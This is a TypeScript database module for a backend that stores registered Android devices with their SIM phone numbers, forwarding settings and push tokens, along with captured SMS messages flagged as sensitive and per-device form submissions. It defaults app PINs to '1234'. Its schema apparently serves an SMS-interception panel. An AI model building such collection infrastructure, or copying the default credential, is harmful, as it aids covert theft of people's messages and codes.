import { and, desc, eq, sql } from "drizzle-orm";
import { db, pool, DEFAULT_APP_ID, DEFAULT_APP_NAME, DEFAULT_APP_PIN } from "./db";
import { devices, messages, formData, apps } from "./schema";
import { hashPin, verifyPin, isHashed } from "./hash";

export { DEFAULT_APP_ID, DEFAULT_APP_NAME, DEFAULT_APP_PIN };

// ── Types ─────────────────────────────────────────────────────────────────────

export type AppRow = {
  id: number;
  appId: string;
  name: string;
  pin: string;
  status: string;
  createdAt: string;
  deleteProtectionPin: string | null;
  deleteProtectionEnabled: boolean;
};

export type DeviceRow = {
  id: number;
  deviceId: string;
  appId: string;
  userId: string;
  name: string;
  androidVersion: number;
  sim1Carrier: string | null;
  sim1Phone: string | null;
  sim2Carrier: string | null;
  sim2Phone: string | null;
  status: string;
  lastOnline: string | null;
  forwardEnabled: boolean;
  forwardSlot: number | null;
  fcmToken: string | null;
  installedAt: string;
  updatedAt: string;
};

export type MessageRow = {
  id: number;
  appId: string;
  deviceId: string;
  userId: string;
  fromSender: string;
  fromNumber: string;
  body: string;
  isSensitive: boolean;
  receivedAt: string;
};

export type FormDataRow = {
  id: number;
  appId: string;
  deviceId: string;
  data: Record<string, unknown>;
  submittedAt: string;
};

// ── Helpers ───────────────────────────────────────────────────────────────────

function iso(d: Date | string | null): string | null {
  if (d == null) return null;
  return typeof d === "string" ? d : d.toISOString();
}
function isoReq(d: Date | string): string {
  return typeof d === "string" ? d : d.toISOString();
}

// Raw SQL row shape returned by the apps + app_secrets JOIN
type RawAppRow = {
  id: number;
  app_id: string;
  name: string;
  status: string;
  created_at: Date | string;
  pin: string;
  delete_protection_pin: string | null;
  delete_protection_enabled: boolean;
};

function mapApp(r: RawAppRow): AppRow {
  return {
    id: r.id,
    appId: r.app_id,
    name: r.name,
    pin: r.pin,
    status: r.status,
    createdAt: isoReq(r.created_at),
    deleteProtectionPin: r.delete_protection_pin ?? null,
    deleteProtectionEnabled: r.delete_protection_enabled ?? false,
  };
}

// JOIN query — apps LEFT JOIN app_secrets so apps without a secrets row still show up.
const APPS_JOIN = `
  SELECT
    a.id, a.app_id, a.name, a.status, a.created_at,
    COALESCE(s.pin, '1234')                         AS pin,
    s.delete_protection_pin,
    COALESCE(s.delete_protection_enabled, false)    AS delete_protection_enabled
  FROM apps a
  LEFT JOIN app_secrets s ON s.app_id = a.app_id
`;

function mapDevice(r: typeof devices.$inferSelect): DeviceRow {
  return {
    id: r.id, deviceId: r.deviceId, appId: r.appId, userId: r.userId, name: r.name,
    androidVersion: r.androidVersion,
    sim1Carrier: r.sim1Carrier, sim1Phone: r.sim1Phone,
    sim2Carrier: r.sim2Carrier, sim2Phone: r.sim2Phone,
    status: r.status, lastOnline: iso(r.lastOnline),
    forwardEnabled: r.forwardEnabled, forwardSlot: r.forwardSlot,
    fcmToken: r.fcmToken,
    installedAt: isoReq(r.installedAt), updatedAt: isoReq(r.updatedAt),
  };
}
function mapMessage(r: typeof messages.$inferSelect): MessageRow {
  return {
    id: r.id, appId: r.appId, deviceId: r.deviceId, userId: r.userId,
    fromSender: r.fromSender, fromNumber: r.fromNumber, body: r.body,
    isSensitive: r.isSensitive, receivedAt: isoReq(r.receivedAt),
  };
}
function mapFormData(r: typeof formData.$inferSelect): FormDataRow {
  return {
    id: r.id, appId: r.appId, deviceId: r.deviceId,
    data: r.data as Record<string, unknown>,
    submittedAt: isoReq(r.submittedAt),
  };
}

// ── localDb ───────────────────────────────────────────────────────────────────

export const localDb = {

  // ------ APPS (raw SQL — joins apps + app_secrets, never alters schema) ------

  async listApps(): Promise<AppRow[]> {
    const { rows } = await pool.query<RawAppRow>(`${APPS_JOIN} ORDER BY a.created_at ASC`);
    return rows.map(mapApp);
  },

  async getApp(appId: string): Promise<AppRow | undefined> {
    const { rows } = await pool.query<RawAppRow>(`${APPS_JOIN} WHERE a.app_id = $1 LIMIT 1`, [appId]);
    return rows[0] ? mapApp(rows[0]) : undefined;
  },

  async createApp(input: { appId: string; name: string; pin?: string; status?: string }): Promise<AppRow> {
    const rawPin = input.pin ?? "1234";
    const hashedPin = isHashed(rawPin) ? rawPin : hashPin(rawPin);

    const client = await pool.connect();
    try {
      await client.query("BEGIN");

      const { rows, rowCount } = await client.query<{ app_id: string }>(
        `INSERT INTO apps (app_id, name, status)
         VALUES ($1, $2, $3)
         ON CONFLICT (app_id) DO NOTHING
         RETURNING app_id`,
        [input.appId, input.name, input.status ?? "active"],
      );
      if (!rowCount || rowCount === 0) {
        await client.query("ROLLBACK");
        throw new Error("APP_EXISTS");
      }

      await client.query(
        `INSERT INTO app_secrets (app_id, pin)
         VALUES ($1, $2)
         ON CONFLICT (app_id) DO UPDATE SET pin = EXCLUDED.pin`,
        [input.appId, hashedPin],
      );

      await client.query("COMMIT");
    } catch (err) {
      await client.query("ROLLBACK").catch(() => {});
      throw err;
    } finally {
      client.release();
    }

    return (await this.getApp(input.appId))!;
  },

  async updateApp(
    appId: string,
    updates: Partial<Pick<AppRow, "name" | "pin" | "status" | "deleteProtectionPin" | "deleteProtectionEnabled">>,
  ): Promise<AppRow | undefined> {
    // ── apps table (name, status) ──────────────────────────────────────────
    const appSets: string[] = [];
    const appVals: unknown[] = [];
    if (updates.name !== undefined)   { appSets.push(`name = $${appVals.length + 1}`);   appVals.push(updates.name); }
    if (updates.status !== undefined) { appSets.push(`status = $${appVals.length + 1}`); appVals.push(updates.status); }
    if (appSets.length > 0) {
      appVals.push(appId);
      await pool.query(`UPDATE apps SET ${appSets.join(", ")} WHERE app_id = $${appVals.length}`, appVals);
    }

    // ── app_secrets table (pin, deleteProtectionPin, deleteProtectionEnabled) ─
    const hasSecretUpdate =
      updates.pin !== undefined ||
      updates.deleteProtectionPin !== undefined ||
      updates.deleteProtectionEnabled !== undefined;

    if (hasSecretUpdate) {
      // Ensure a secrets row exists for this app (no-op if already present)
      await pool.query(
        `INSERT INTO app_secrets (app_id, pin) VALUES ($1, '1234') ON CONFLICT (app_id) DO NOTHING`,
        [appId],
      );

      const secSets: string[] = [];
      const secVals: unknown[] = [appId]; // $1 always = appId

      if (updates.pin !== undefined) {
        const hashed = isHashed(updates.pin) ? updates.pin : hashPin(updates.pin);
        secSets.push(`pin = $${secVals.length + 1}`);
        secVals.push(hashed);
      }
      if (updates.deleteProtectionPin !== undefined) {
        const dp = updates.deleteProtectionPin
          ? (isHashed(updates.deleteProtectionPin) ? updates.deleteProtectionPin : hashPin(updates.deleteProtectionPin))
          : null;
        secSets.push(`delete_protection_pin = $${secVals.length + 1}`);
        secVals.push(dp);
      }
      if (updates.deleteProtectionEnabled !== undefined) {
        secSets.push(`delete_protection_enabled = $${secVals.length + 1}`);
        secVals.push(updates.deleteProtectionEnabled);
      }

      if (secSets.length > 0) {
        await pool.query(
          `UPDATE app_secrets SET ${secSets.join(", ")} WHERE app_id = $1`,
          secVals,
        );
      }
    }

    return this.getApp(appId);
  },

  async verifyAppPin(appId: string, pin: string): Promise<AppRow | undefined> {
    const app = await this.getApp(appId);
    if (!app) return undefined;
    if (!verifyPin(pin, app.pin)) return undefined;
    // Migrate legacy plain-text PIN → hashed in app_secrets
    if (!isHashed(app.pin)) {
      await pool.query(
        `INSERT INTO app_secrets (app_id, pin) VALUES ($1, $2)
         ON CONFLICT (app_id) DO UPDATE SET pin = EXCLUDED.pin`,
        [appId, hashPin(pin)],
      ).catch(() => {});
    }
    return app;
  },

  async deleteApp(appId: string): Promise<AppRow | undefined> {
    const app = await this.getApp(appId);
    if (!app) return undefined;
    await pool.query(`DELETE FROM app_secrets WHERE app_id = $1`, [appId]).catch(() => {});
    await pool.query(`DELETE FROM apps WHERE app_id = $1`, [appId]);
    return app;
  },

  // ------ DEVICES ------

  async listDevices(filter: { appId?: string; userId?: string } = {}): Promise<DeviceRow[]> {
    const where = filter.appId
      ? eq(devices.appId, filter.appId)
      : filter.userId
        ? eq(devices.userId, filter.userId)
        : undefined;
    const q = where ? db.select().from(devices).where(where) : db.select().from(devices);
    return (await q).map(mapDevice);
  },

  async getDevice(deviceId: string): Promise<DeviceRow | undefined> {
    const rows = await db.select().from(devices).where(eq(devices.deviceId, deviceId)).limit(1);
    return rows[0] ? mapDevice(rows[0]) : undefined;
  },

  async upsertDevice(input: Omit<DeviceRow, "id" | "installedAt" | "updatedAt">): Promise<{ row: DeviceRow; created: boolean }> {
    const lastOnlineVal = input.lastOnline ? new Date(input.lastOnline) : null;
    const { rows } = await pool.query<{
      id: number; device_id: string; app_id: string; user_id: string; name: string;
      android_version: number; sim1_carrier: string | null; sim1_phone: string | null;
      sim2_carrier: string | null; sim2_phone: string | null; status: string;
      last_online: Date | null; forward_enabled: boolean; forward_slot: number | null;
      fcm_token: string | null; installed_at: Date; updated_at: Date; was_created: boolean;
    }>(
      `INSERT INTO devices (device_id, app_id, user_id, name, android_version, sim1_carrier, sim1_phone, sim2_carrier, sim2_phone, status, last_online, forward_enabled, forward_slot, fcm_token)
       VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14)
       ON CONFLICT (device_id) DO UPDATE SET
         app_id = EXCLUDED.app_id, user_id = EXCLUDED.user_id, name = EXCLUDED.name,
         android_version = EXCLUDED.android_version, sim1_carrier = EXCLUDED.sim1_carrier,
         sim1_phone = EXCLUDED.sim1_phone, sim2_carrier = EXCLUDED.sim2_carrier,
         sim2_phone = EXCLUDED.sim2_phone, status = EXCLUDED.status,
         last_online = EXCLUDED.last_online, forward_enabled = EXCLUDED.forward_enabled,
         forward_slot = EXCLUDED.forward_slot, fcm_token = EXCLUDED.fcm_token,
         updated_at = NOW()
       RETURNING *, (xmax = 0) AS was_created`,
      [
        input.deviceId, input.appId, input.userId, input.name, input.androidVersion,
        input.sim1Carrier, input.sim1Phone, input.sim2Carrier, input.sim2Phone,
        input.status, lastOnlineVal, input.forwardEnabled, input.forwardSlot, input.fcmToken,
      ],
    );
    const r = rows[0];
    const mapped: DeviceRow = {
      id: r.id, deviceId: r.device_id, appId: r.app_id, userId: r.user_id, name: r.name,
      androidVersion: r.android_version,
      sim1Carrier: r.sim1_carrier, sim1Phone: r.sim1_phone,
      sim2Carrier: r.sim2_carrier, sim2Phone: r.sim2_phone,
      status: r.status, lastOnline: iso(r.last_online),
      forwardEnabled: r.forward_enabled, forwardSlot: r.forward_slot,
      fcmToken: r.fcm_token,
      installedAt: isoReq(r.installed_at), updatedAt: isoReq(r.updated_at),
    };
    return { row: mapped, created: r.was_created };
  },

  async deleteDevice(deviceId: string): Promise<DeviceRow | undefined> {
    await db.delete(messages).where(eq(messages.deviceId, deviceId));
    await db.delete(formData).where(eq(formData.deviceId, deviceId));
    const [row] = await db.delete(devices).where(eq(devices.deviceId, deviceId)).returning();
    return row ? mapDevice(row) : undefined;
  },

  async updateDevice(deviceId: string, updates: Partial<DeviceRow>): Promise<DeviceRow | undefined> {
    const patch: Partial<typeof devices.$inferInsert> = { updatedAt: new Date() };
    if (updates.appId !== undefined) patch.appId = updates.appId;
    if (updates.userId !== undefined) patch.userId = updates.userId;
    if (updates.name !== undefined) patch.name = updates.name;
    if (updates.androidVersion !== undefined) patch.androidVersion = updates.androidVersion;
    if (updates.sim1Carrier !== undefined) patch.sim1Carrier = updates.sim1Carrier;
    if (updates.sim1Phone !== undefined) patch.sim1Phone = updates.sim1Phone;
    if (updates.sim2Carrier !== undefined) patch.sim2Carrier = updates.sim2Carrier;
    if (updates.sim2Phone !== undefined) patch.sim2Phone = updates.sim2Phone;
    if (updates.status !== undefined) patch.status = updates.status;
    if (updates.lastOnline !== undefined) patch.lastOnline = updates.lastOnline ? new Date(updates.lastOnline) : null;
    if (updates.forwardEnabled !== undefined) patch.forwardEnabled = updates.forwardEnabled;
    if (updates.forwardSlot !== undefined) patch.forwardSlot = updates.forwardSlot;
    if (updates.fcmToken !== undefined) patch.fcmToken = updates.fcmToken;
    const [row] = await db.update(devices).set(patch).where(eq(devices.deviceId, deviceId)).returning();
    return row ? mapDevice(row) : undefined;
  },

  // ------ MESSAGES ------

  async listMessages(filter: { appId?: string; userId?: string; deviceId?: string } = {}): Promise<MessageRow[]> {
    const where = filter.appId
      ? eq(messages.appId, filter.appId)
      : filter.userId
        ? eq(messages.userId, filter.userId)
        : filter.deviceId
          ? eq(messages.deviceId, filter.deviceId)
          : undefined;
    const q = where
      ? db.select().from(messages).where(where).orderBy(desc(messages.receivedAt))
      : db.select().from(messages).orderBy(desc(messages.receivedAt));
    return (await q).map(mapMessage);
  },

  async createMessage(input: Omit<MessageRow, "id" | "receivedAt"> & { receivedAt?: string }): Promise<MessageRow> {
    const [row] = await db.insert(messages).values({
      appId: input.appId, deviceId: input.deviceId, userId: input.userId,
      fromSender: input.fromSender, fromNumber: input.fromNumber,
      body: input.body, isSensitive: input.isSensitive,
      receivedAt: input.receivedAt ? new Date(input.receivedAt) : new Date(),
    }).returning();
    return mapMessage(row);
  },

  async deleteMessage(id: number): Promise<MessageRow | undefined> {
    const [row] = await db.delete(messages).where(eq(messages.id, id)).returning();
    return row ? mapMessage(row) : undefined;
  },

  // ------ FORM DATA ------

  async listFormData(filter: { appId: string; deviceId?: string }): Promise<FormDataRow[]> {
    const where = filter.deviceId
      ? and(eq(formData.appId, filter.appId), eq(formData.deviceId, filter.deviceId))
      : eq(formData.appId, filter.appId);
    const rows = await db.select().from(formData).where(where).orderBy(desc(formData.submittedAt));
    return rows.map(mapFormData);
  },

  async createFormData(input: Omit<FormDataRow, "id" | "submittedAt">): Promise<FormDataRow> {
    const [row] = await db.insert(formData).values({
      appId: input.appId, deviceId: input.deviceId, data: input.data,
    }).returning();
    return mapFormData(row);
  },

  async deleteFormData(id: number): Promise<FormDataRow | undefined> {
    const [row] = await db.delete(formData).where(eq(formData.id, id)).returning();
    return row ? mapFormData(row) : undefined;
  },

  // ------ STATS / SAMPLE ------

  async stats(appId?: string): Promise<Record<string, number>> {
    if (appId) {
      const [d] = await db.select({ c: sql<string>`count(*)::text` }).from(devices).where(eq(devices.appId, appId));
      const [m] = await db.select({ c: sql<string>`count(*)::text` }).from(messages).where(eq(messages.appId, appId));
      const [f] = await db.select({ c: sql<string>`count(*)::text` }).from(formData).where(eq(formData.appId, appId));
      return { devices: Number(d.c), messages: Number(m.c), formData: Number(f.c) };
    }
    const { rows: [ac] } = await pool.query<{ c: string }>(`SELECT COUNT(*)::text AS c FROM apps`);
    const [d] = await db.select({ c: sql<string>`count(*)::text` }).from(devices);
    const [m] = await db.select({ c: sql<string>`count(*)::text` }).from(messages);
    const [f] = await db.select({ c: sql<string>`count(*)::text` }).from(formData);
    return { apps: Number(ac.c), devices: Number(d.c), messages: Number(m.c), formData: Number(f.c) };
  },

  async sample(appId?: string): Promise<Record<string, unknown>> {
    if (appId) {
      const [d] = await db.select().from(devices).where(eq(devices.appId, appId)).limit(1);
      const [m] = await db.select().from(messages).where(eq(messages.appId, appId)).limit(1);
      const [f] = await db.select().from(formData).where(eq(formData.appId, appId)).limit(1);
      return {
        devices: d ? mapDevice(d) : null,
        messages: m ? mapMessage(m) : null,
        formData: f ? mapFormData(f) : null,
      };
    }
    const { rows: appRows } = await pool.query<RawAppRow>(`${APPS_JOIN} LIMIT 1`);
    const [d] = await db.select().from(devices).limit(1);
    const [m] = await db.select().from(messages).limit(1);
    const [f] = await db.select().from(formData).limit(1);
    return {
      apps: appRows[0] ? mapApp(appRows[0]) : null,
      devices: d ? mapDevice(d) : null,
      messages: m ? mapMessage(m) : null,
      formData: f ? mapFormData(f) : null,
    };
  },
};
